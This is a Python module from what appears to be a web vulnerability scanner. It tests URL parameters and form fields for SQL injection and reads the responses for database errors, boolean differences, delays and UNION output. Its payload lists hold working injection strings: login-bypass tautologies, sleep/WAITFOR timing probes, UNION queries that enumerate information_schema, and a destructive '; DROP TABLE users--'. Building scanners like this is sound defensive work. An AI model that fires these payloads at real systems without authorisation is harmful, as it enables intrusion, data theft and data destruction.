"""
SQL Injection vulnerability scanner module
Handles detection of SQL injection vulnerabilities
"""

import re
import time
from typing import List, Dict, Set, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.scanner import Vulnerability, VulnerabilityType
from core.crawler import FormInfo
from utils.logger import setup_logger


class SQLiScanner:
    """SQL Injection vulnerability scanner"""
    
    def __init__(self, config, http_client):
        self.config = config
        self.http_client = http_client
        self.logger = setup_logger("SQLiScanner", verbose=True)
        
        # SQL error patterns for different database systems
        self.sql_error_patterns = [
            # MySQL
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"MySQL server version",
            r"mysql_fetch",
            r"Table.*doesn't exist",
            r"Column.*cannot be null",
            r"Access denied for user",
            
            # PostgreSQL
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"syntax error at or near",
            r"column.*does not exist",
            r"relation.*does not exist",
            
            # SQL Server
            r"Driver.*SQL.*Server",
            r"OLE DB.*SQL Server",
            r"(\[|\()*SQL Server.*Driver",
            r"Warning.*mssql_.*",
            r"Microsoft SQL Native Client",
            r"ODBC SQL Server Driver",
            r"Unclosed quotation mark",
            r"Incorrect syntax near",
            
            # Oracle
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_.*",
            r"Warning.*ora_.*",
            r"ORA-[0-9]{5}",
            r"Oracle Database",
            
            # SQLite
            r"SQLite.*error",
            r"sqlite3.OperationalError",
            r"SQLite format",
            r"no such table",
            r"no such column",
            
            # Access
            r"Microsoft Access Driver",
            r"JET Database Engine",
            r"Access Database Engine",
            r"ODBC Microsoft Access",
            
            # Generic SQL errors
            r"SQL command not properly ended",
            r"quoted string not properly terminated",
            r"unterminated quoted string",
            r"SQL Error",
            r"database error",
            r"syntax error",
            r"mysql_error",
            r"ORA-",
            r"Microsoft OLE DB Provider",
            r"ADODB.Field",
            r"ADODB.Recordset",
        ]
        
        # Compile patterns for performance
        self.compiled_error_patterns = [re.compile(pattern, re.IGNORECASE) for pattern in self.sql_error_patterns]
        
        # Load SQL injection payloads
        self.error_payloads = self._load_error_payloads()
        self.boolean_payloads = self._load_boolean_payloads()
        self.time_payloads = self._load_time_payloads()
        self.union_payloads = self._load_union_payloads()
    
    def _load_error_payloads(self) -> List[str]:
        """Load error-based SQL injection payloads"""
        return [
            "'", '"', "''", '""',
            "' OR '1'='1", '" OR "1"="1',
            "' OR 1=1--", '" OR 1=1--',
            "') OR ('1'='1", '") OR ("1"="1',
            "' OR 1=1#", '" OR 1=1#',
            "' OR 1=1/*", '" OR 1=1/*',
            "' UNION SELECT NULL--", '" UNION SELECT NULL--',
            "'; DROP TABLE users--", '"; DROP TABLE users--',
            "' AND 1=2--", '" AND 1=2--',
            "' AND 1=1--", '" AND 1=1--',
            "' OR 'a'='a", '" OR "a"="a',
            "' OR 'a'='b", '" OR "a"="b',
            "' AND 'a'='a", '" AND "a"="a',
            "' AND 'a'='b", '" AND "a"="b',
            "admin'--", 'admin"--',
            "admin'/*", 'admin"/*',
            "' OR 1=1 LIMIT 1--", '" OR 1=1 LIMIT 1--',
            "' OR 1=1 ORDER BY 1--", '" OR 1=1 ORDER BY 1--',
            "' HAVING 1=1--", '" HAVING 1=1--',
            "' GROUP BY 1--", '" GROUP BY 1--',
        ]
    
    def _load_boolean_payloads(self) -> List[Dict[str, str]]:
        """Load boolean-based SQL injection payloads"""
        return [
            {"true": "' OR '1'='1", "false": "' OR '1'='2"},
            {"true": '" OR "1"="1', "false": '" OR "1"="2'},
            {"true": " OR 1=1", "false": " OR 1=2"},
            {"true": "' OR 'a'='a", "false": "' OR 'a'='b"},
            {"true": '" OR "a"="a', "false": '" OR "a"="b'},
            {"true": "' AND '1'='1", "false": "' AND '1'='2"},
            {"true": '" AND "1"="1', "false": '" AND "1"="2'},
            {"true": " AND 1=1", "false": " AND 1=2"},
            {"true": "' AND 'a'='a", "false": "' AND 'a'='b"},
            {"true": '" AND "a"="a', "false": '" AND "a"="b'},
        ]
    
    def _load_time_payloads(self) -> List[str]:
        """Load time-based SQL injection payloads"""
        return [
            # MySQL
            "' OR SLEEP(5)--",
            '" OR SLEEP(5)--',
            "' AND SLEEP(5)--",
            '" AND SLEEP(5)--',
            "'; WAITFOR DELAY '0:0:5'--",
            '"; WAITFOR DELAY \'0:0:5\'--',
            
            # PostgreSQL
            "' OR pg_sleep(5)--",
            '" OR pg_sleep(5)--',
            "' AND pg_sleep(5)--",
            '" AND pg_sleep(5)--',
            
            # SQL Server
            "'; WAITFOR DELAY '0:0:5'--",
            '"; WAITFOR DELAY \'0:0:5\'--',
            "' AND WAITFOR DELAY '0:0:5'--",
            '" AND WAITFOR DELAY \'0:0:5\'--',
            
            # Oracle
            "' OR DBMS_LOCK.SLEEP(5)--",
            '" OR DBMS_LOCK.SLEEP(5)--',
            "' AND DBMS_LOCK.SLEEP(5)--",
            '" AND DBMS_LOCK.SLEEP(5)--',
            
            # SQLite
            "' OR randomblob(100000000)--",
            '" OR randomblob(100000000)--',
        ]
    
    def _load_union_payloads(self) -> List[str]:
        """Load UNION-based SQL injection payloads"""
        return [
            "' UNION SELECT NULL--",
            '" UNION SELECT NULL--',
            "' UNION SELECT NULL,NULL--",
            '" UNION SELECT NULL,NULL--',
            "' UNION SELECT NULL,NULL,NULL--",
            '" UNION SELECT NULL,NULL,NULL--',
            "' UNION SELECT 1--",
            '" UNION SELECT 1--',
            "' UNION SELECT 1,2--",
            '" UNION SELECT 1,2--',
            "' UNION SELECT 1,2,3--",
            '" UNION SELECT 1,2,3--',
            "' UNION SELECT user()--",
            '" UNION SELECT user()--',
            "' UNION SELECT version()--",
            '" UNION SELECT version()--',
            "' UNION SELECT database()--",
            '" UNION SELECT database()--',
            "' UNION SELECT @@version--",
            '" UNION SELECT @@version--',
            "' UNION SELECT table_name FROM information_schema.tables--",
            '" UNION SELECT table_name FROM information_schema.tables--',
            "' UNION SELECT column_name FROM information_schema.columns--",
            '" UNION SELECT column_name FROM information_schema.columns--',
        ]
    
    def scan_url(self, url: str, parameters: Set[str] = None) -> List[Vulnerability]:
        """Scan URL for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        if not parameters:
            # Extract parameters from URL
            parsed_url = urlparse(url)
            if parsed_url.query:
                parameters = set(parse_qs(parsed_url.query).keys())
            else:
                return vulnerabilities
        
        # Test each parameter
        for param in parameters:
            vulns = self._test_parameter_sqli(url, param)
            vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    def scan_form(self, form: FormInfo) -> List[Vulnerability]:
        """Scan form for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        if not form.inputs:
            return vulnerabilities
        
        # Get test data for the form
        base_data = form.get_test_data()
        
        # Test each input field
        for input_field in form.inputs:
            param_name = input_field.get('name', '')
            if not param_name or input_field.get('type', '').lower() in ['submit', 'button', 'image', 'reset']:
                continue
            
            vulns = self._test_form_input_sqli(form, param_name, base_data)
            vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    def _test_parameter_sqli(self, url: str, parameter: str) -> List[Vulnerability]:
        """Test a specific parameter for SQL injection"""
        vulnerabilities = []
        
        # Get baseline response first
        baseline_response = self._get_baseline_response(url)
        if not baseline_response:
            return vulnerabilities
        
        # Test different types of SQL injection
        vulns = []
        vulns.extend(self._test_error_based_sqli(url, parameter, baseline_response))
        vulns.extend(self._test_boolean_based_sqli(url, parameter, baseline_response))
        vulns.extend(self._test_time_based_sqli(url, parameter, baseline_response))
        vulns.extend(self._test_union_based_sqli(url, parameter, baseline_response))
        
        vulnerabilities.extend(vulns)
        return vulnerabilities
    
    def _test_form_input_sqli(self, form: FormInfo, parameter: str, base_data: Dict[str, str]) -> List[Vulnerability]:
        """Test form input for SQL injection"""
        vulnerabilities = []
        
        # Get baseline response
        baseline_response = self._get_baseline_form_response(form, base_data)
        if not baseline_response:
            return vulnerabilities
        
        # Test different types of SQL injection
        vulns = []
        vulns.extend(self._test_form_error_based_sqli(form, parameter, base_data, baseline_response))
        vulns.extend(self._test_form_boolean_based_sqli(form, parameter, base_data, baseline_response))
        vulns.extend(self._test_form_time_based_sqli(form, parameter, base_data, baseline_response))
        vulns.extend(self._test_form_union_based_sqli(form, parameter, base_data, baseline_response))
        
        vulnerabilities.extend(vulns)
        return vulnerabilities
    
    def _get_baseline_response(self, url: str) -> Optional[object]:
        """Get baseline response for comparison"""
        try:
            return self.http_client.get(url)
        except Exception as e:
            self.logger.error(f"Error getting baseline response for {url}: {e}")
            return None
    
    def _get_baseline_form_response(self, form: FormInfo, form_data: Dict[str, str]) -> Optional[object]:
        """Get baseline form response for comparison"""
        try:
            if form.method.upper() == 'POST':
                return self.http_client.post(form.action, data=form_data)
            else:
                return self.http_client.get(form.action, params=form_data)
        except Exception as e:
            self.logger.error(f"Error getting baseline form response for {form.action}: {e}")
            return None
    
    def _test_error_based_sqli(self, url: str, parameter: str, baseline_response: object) -> List[Vulnerability]:
        """Test for error-based SQL injection"""
        vulnerabilities = []
        
        parsed_url = urlparse(url)
        base_params = parse_qs(parsed_url.query) if parsed_url.query else {}
        
        for payload in self.error_payloads:
            try:
                # Create test URL with payload
                test_params = base_params.copy()
                test_params[parameter] = [payload]
                
                query_string = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    query_string,
                    ''
                ))
                
                # Send request
                start_time = time.time()
                response = self.http_client.get(test_url)
                response_time = time.time() - start_time
                
                # Check for SQL errors
                if self._detect_sql_error(response.text):
                    vulnerability = Vulnerability(
                        vuln_type=VulnerabilityType.SQLI_ERROR,
                        url=test_url,
                        parameter=parameter,
                        payload=payload,
                        evidence=self._extract_sql_error_evidence(response.text),
                        method="GET",
                        response_time=response_time,
                        status_code=response.status_code
                    )
                    vulnerabilities.append(vulnerability)
                    self.logger.info(f"Error-based SQL injection found: {test_url} - Parameter: {parameter}")
                    break  # One payload per parameter is enough
                
                # Rate limiting
                if hasattr(self.config, 'delay_between_requests'):
                    time.sleep(self.config.delay_between_requests)
                
            except Exception as e:
                self.logger.error(f"Error testing error-based SQL injection on {url} parameter {parameter}: {e}")
        
        return vulnerabilities
    
    def _test_boolean_based_sqli(self, url: str, parameter: str, baseline_response: object) -> List[Vulnerability]:
        """Test for boolean-based SQL injection"""
        vulnerabilities = []
        
        parsed_url = urlparse(url)
        base_params = parse_qs(parsed_url.query) if parsed_url.query else {}
        baseline_length = len(baseline_response.text)
        
        for payload_pair in self.boolean_payloads:
            try:
                # Test true condition
                test_params = base_params.copy()
                test_params[parameter] = [payload_pair["true"]]
                
                query_string = urlencode(test_params, doseq=True)
                test_url_true = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    query_string,
                    ''
                ))
                
                response_true = self.http_client.get(test_url_true)
                
                # Test false condition
                test_params[parameter] = [payload_pair["false"]]
                query_string = urlencode(test_params, doseq=True)
                test_url_false = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    query_string,
                    ''
                ))
                
                response_false = self.http_client.get(test_url_false)
                
                # Compare responses
                if self._compare_boolean_responses(response_true, response_false, baseline_response):
                    vulnerability = Vulnerability(
                        vuln_type=VulnerabilityType.SQLI_BOOLEAN,
                        url=test_url_true,
                        parameter=parameter,
                        payload=payload_pair["true"],
                        evidence=f"Boolean-based SQL injection detected. True condition length: {len(response_true.text)}, False condition length: {len(response_false.text)}",
                        method="GET",
                        status_code=response_true.status_code
                    )
                    vulnerabilities.append(vulnerability)
                    self.logger.info(f"Boolean-based SQL injection found: {test_url_true} - Parameter: {parameter}")
                    break
                
                # Rate limiting
                if hasattr(self.config, 'delay_between_requests'):
                    time.sleep(self.config.delay_between_requests)
                
            except Exception as e:
                self.logger.error(f"Error testing boolean-based SQL injection on {url} parameter {parameter}: {e}")
        
        return vulnerabilities
    
    def _test_time_based_sqli(self, url: str, parameter: str, baseline_response: object) -> List[Vulnerability]:
        """Test for time-based SQL injection"""
        vulnerabilities = []
        
        parsed_url = urlparse(url)
        base_params = parse_qs(parsed_url.query) if parsed_url.query else {}
        
        for payload in self.time_payloads:
            try:
                # Create test URL with payload
                test_params = base_params.copy()
                test_params[parameter] = [payload]
                
                query_string = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    query_string,
                    ''
                ))
                
                # Send request and measure time
                start_time = time.time()
                response = self.http_client.get(test_url)
                response_time = time.time() - start_time
                
                # Check if response took significantly longer (indicating time-based injection)
                if response_time > 4.0:  # 4 seconds threshold
                    vulnerability = Vulnerability(
                        vuln_type=VulnerabilityType.SQLI_TIME,
                        url=test_url,
                        parameter=parameter,
                        payload=payload,
                        evidence=f"Time-based SQL injection detected. Response time: {response_time:.2f} seconds",
                        method="GET",
                        response_time=response_time,
                        status_code=response.status_code
                    )
                    vulnerabilities.append(vulnerability)
                    self.logger.info(f"Time-based SQL injection found: {test_url} - Parameter: {parameter}")
                    break
                
                # Rate limiting
                if hasattr(self.config, 'delay_between_requests'):
                    time.sleep(self.config.delay_between_requests)
                
            except Exception as e:
                self.logger.error(f"Error testing time-based SQL injection on {url} parameter {parameter}: {e}")
        
        return vulnerabilities
    
    def _test_union_based_sqli(self, url: str, parameter: str, baseline_response: object) -> List[Vulnerability]:
        """Test for UNION-based SQL injection"""
        vulnerabilities = []
        
        parsed_url = urlparse(url)
        base_params = parse_qs(parsed_url.query) if parsed_url.query else {}
        
        for payload in self.union_payloads:
            try:
                # Create test URL with payload
                test_params = base_params.copy()
                test_params[parameter] = [payload]
                
                query_string = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    query_string,
                    ''
                ))
                
                # Send request
                start_time = time.time()
                response = self.http_client.get(test_url)
                response_time = time.time() - start_time
                
                # Check for UNION injection indicators
                if self._detect_union_injection(response.text, baseline_response.text):
                    vulnerability = Vulnerability(
                        vuln_type=VulnerabilityType.SQLI_UNION,
                        url=test_url,
                        parameter=parameter,
                        payload=payload,
                        evidence=self._extract_union_evidence(response.text),
                        method="GET",
                        response_time=response_time,
                        status_code=response.status_code
                    )
                    vulnerabilities.append(vulnerability)
                    self.logger.info(f"UNION-based SQL injection found: {test_url} - Parameter: {parameter}")
                    break
                
                # Rate limiting
                if hasattr(self.config, 'delay_between_requests'):
                    time.sleep(self.config.delay_between_requests)
                
            except Exception as e:
                self.logger.error(f"Error testing UNION-based SQL injection on {url} parameter {parameter}: {e}")
        
        return vulnerabilities
    
    def _test_form_error_based_sqli(self, form: FormInfo, parameter: str, base_data: Dict[str, str], baseline_response: object) -> List[Vulnerability]:
        """Test form for error-based SQL injection"""
        vulnerabilities = []
        
        for payload in self.error_payloads:
            try:
                # Create form data with payload
                form_data = base_data.copy()
                form_data[parameter] = payload
                
                # Send request
                start_time = time.time()
                if form.method.upper() == 'POST':
                    response = self.http_client.post(form.action, data=form_data)
                else:
                    response = self.http_client.get(form.action, params=form_data)
                
                response_time = time.time() - start_time
                
                # Check for SQL errors
                if self._detect_sql_error(response.text):
                    vulnerability = Vulnerability(
                        vuln_type=VulnerabilityType.SQLI_ERROR,
                        url=form.action,
                        parameter=parameter,
                        payload=payload,
                        evidence=self._extract_sql_error_evidence(response.text),
                        method=form.method,
                        form_data=form_data,
                        response_time=response_time,
                        status_code=response.status_code
                    )
                    vulnerabilities.append(vulnerability)
                    self.logger.info(f"Error-based SQL injection found in form: {form.action} - Parameter: {parameter}")
                    break
                
                # Rate limiting
                if hasattr(self.config, 'delay_between_requests'):
                    time.sleep(self.config.delay_between_requests)
                
            except Exception as e:
                self.logger.error(f"Error testing error-based SQL injection on form {form.action} parameter {parameter}: {e}")
        
        return vulnerabilities
    
    def _test_form_boolean_based_sqli(self, form: FormInfo, parameter: str, base_data: Dict[str, str], baseline_response: object) -> List[Vulnerability]:
        """Test form for boolean-based SQL injection"""
        vulnerabilities = []
        
        for payload_pair in self.boolean_payloads:
            try:
                # Test true condition
                form_data_true = base_data.copy()
                form_data_true[parameter] = payload_pair["true"]
                
                if form.method.upper() == 'POST':
                    response_true = self.http_client.post(form.action, data=form_data_true)
                else:
                    response_true = self.http_client.get(form.action, params=form_data_true)
                
                # Test false condition
                form_data_false = base_data.copy()
                form_data_false[parameter] = payload_pair["false"]
                
                if form.method.upper() == 'POST':
                    response_false = self.http_client.post(form.action, data=form_data_false)
                else:
                    response_false = self.http_client.get(form.action, params=form_data_false)
                
                # Compare responses
                if self._compare_boolean_responses(response_true, response_false, baseline_response):
                    vulnerability = Vulnerability(
                        vuln_type=VulnerabilityType.SQLI_BOOLEAN,
                        url=form.action,
                        parameter=parameter,
                        payload=payload_pair["true"],
                        evidence=f"Boolean-based SQL injection detected. True condition length: {len(response_true.text)}, False condition length: {len(response_false.text)}",
                        method=form.method,
                        form_data=form_data_true,
                        status_code=response_true.status_code
                    )
                    vulnerabilities.append(vulnerability)
                    self.logger.info(f"Boolean-based SQL injection found in form: {form.action} - Parameter: {parameter}")
                    break
                
                # Rate limiting
                if hasattr(self.config, 'delay_between_requests'):
                    time.sleep(self.config.delay_between_requests)
                
            except Exception as e:
                self.logger.error(f"Error testing boolean-based SQL injection on form {form.action} parameter {parameter}: {e}")
        
        return vulnerabilities
    
    def _test_form_time_based_sqli(self, form: FormInfo, parameter: str, base_data: Dict[str, str], baseline_response: object) -> List[Vulnerability]:
        """Test form for time-based SQL injection"""
        vulnerabilities = []
        
        for payload in self.time_payloads:
            try:
                # Create form data with payload
                form_data = base_data.copy()
                form_data[parameter] = payload
                
                # Send request and measure time
                start_time = time.time()
                if form.method.upper() == 'POST':
                    response = self.http_client.post(form.action, data=form_data)
                else:
                    response = self.http_client.get(form.action, params=form_data)
                
                response_time = time.time() - start_time
                
                # Check if response took significantly longer
                if response_time > 4.0:  # 4 seconds threshold
                    vulnerability = Vulnerability(
                        vuln_type=VulnerabilityType.SQLI_TIME,
                        url=form.action,
                        parameter=parameter,
                        payload=payload,
                        evidence=f"Time-based SQL injection detected. Response time: {response_time:.2f} seconds",
                        method=form.method,
                        form_data=form_data,
                        response_time=response_time,
                        status_code=response.status_code
                    )
                    vulnerabilities.append(vulnerability)
                    self.logger.info(f"Time-based SQL injection found in form: {form.action} - Parameter: {parameter}")
                    break
                
                # Rate limiting
                if hasattr(self.config, 'delay_between_requests'):
                    time.sleep(self.config.delay_between_requests)
                
            except Exception as e:
                self.logger.error(f"Error testing time-based SQL injection on form {form.action} parameter {parameter}: {e}")
        
        return vulnerabilities
    
    def _test_form_union_based_sqli(self, form: FormInfo, parameter: str, base_data: Dict[str, str], baseline_response: object) -> List[Vulnerability]:
        """Test form for UNION-based SQL injection"""
        vulnerabilities = []
        
        for payload in self.union_payloads:
            try:
                # Create form data with payload
                form_data = base_data.copy()
                form_data[parameter] = payload
                
                # Send request
                start_time = time.time()
                if form.method.upper() == 'POST':
                    response = self.http_client.post(form.action, data=form_data)
                else:
                    response = self.http_client.get(form.action, params=form_data)
                
                response_time = time.time() - start_time
                
                # Check for UNION injection indicators
                if self._detect_union_injection(response.text, baseline_response.text):
                    vulnerability = Vulnerability(
                        vuln_type=VulnerabilityType.SQLI_UNION,
                        url=form.action,
                        parameter=parameter,
                        payload=payload,
                        evidence=self._extract_union_evidence(response.text),
                        method=form.method,
                        form_data=form_data,
                        response_time=response_time,
                        status_code=response.status_code
                    )
                    vulnerabilities.append(vulnerability)
                    self.logger.info(f"UNION-based SQL injection found in form: {form.action} - Parameter: {parameter}")
                    break
                
                # Rate limiting
                if hasattr(self.config, 'delay_between_requests'):
                    time.sleep(self.config.delay_between_requests)
                
            except Exception as e:
                self.logger.error(f"Error testing UNION-based SQL injection on form {form.action} parameter {parameter}: {e}")
        
        return vulnerabilities
    
    def _detect_sql_error(self, response_text: str) -> bool:
        """Detect SQL errors in response"""
        for pattern in self.compiled_error_patterns:
            if pattern.search(response_text):
                return True
        return False
    
    def _extract_sql_error_evidence(self, response_text: str) -> str:
        """Extract SQL error evidence from response"""
        for pattern in self.compiled_error_patterns:
            match = pattern.search(response_text)
            if match:
                # Extract context around the error
                start = max(0, match.start() - 50)
                end = min(len(response_text), match.end() + 50)
                return response_text[start:end]
        return "SQL error detected in response"
    
    def _compare_boolean_responses(self, response_true: object, response_false: object, baseline_response: object) -> bool:
        """Compare responses for boolean-based SQL injection"""
        # Compare response lengths
        len_true = len(response_true.text)
        len_false = len(response_false.text)
        len_baseline = len(baseline_response.text)
        
        # Check if there's a significant difference
        if abs(len_true - len_false) > 10:  # Arbitrary threshold
            return True
        
        # Check status codes
        if response_true.status_code != response_false.status_code:
            return True
        
        # Check response times (if available)
        if hasattr(response_true, 'elapsed') and hasattr(response_false, 'elapsed'):
            time_diff = abs(response_true.elapsed.total_seconds() - response_false.elapsed.total_seconds())
            if time_diff > 1.0:  # 1 second difference
                return True
        
        return False
    
    def _detect_union_injection(self, response_text: str, baseline_text: str) -> bool:
        """Detect UNION-based SQL injection"""
        # Check for database-specific information in response
        union_indicators = [
            r'mysql',
            r'postgresql',
            r'microsoft sql server',
            r'oracle',
            r'sqlite',
            r'information_schema',
            r'sysobjects',
            r'syscolumns',
            r'dual',
            r'@@version',
            r'version()',
            r'user()',
            r'database()',
            r'schema()',
        ]
        
        response_lower = response_text.lower()
        baseline_lower = baseline_text.lower()
        
        for indicator in union_indicators:
            if indicator in response_lower and indicator not in baseline_lower:
                return True
        
        # Check for additional columns in response
        if len(response_text) > len(baseline_text) * 1.5:
            return True
        
        return False
    
    def _extract_union_evidence(self, response_text: str) -> str:
        """Extract evidence of UNION-based SQL injection"""
        union_indicators = [
            r'mysql',
            r'postgresql',
            r'microsoft sql server',
            r'oracle',
            r'sqlite',
            r'information_schema',
            r'sysobjects',
            r'syscolumns',
            r'@@version',
            r'version\(\)',
            r'user\(\)',
            r'database\(\)',
        ]
        
        for indicator in union_indicators:
            match = re.search(indicator, response_text, re.IGNORECASE)
            if match:
                start = max(0, match.start() - 50)
                end = min(len(response_text), match.end() + 50)
                return response_text[start:end]
        
        return "UNION-based SQL injection detected"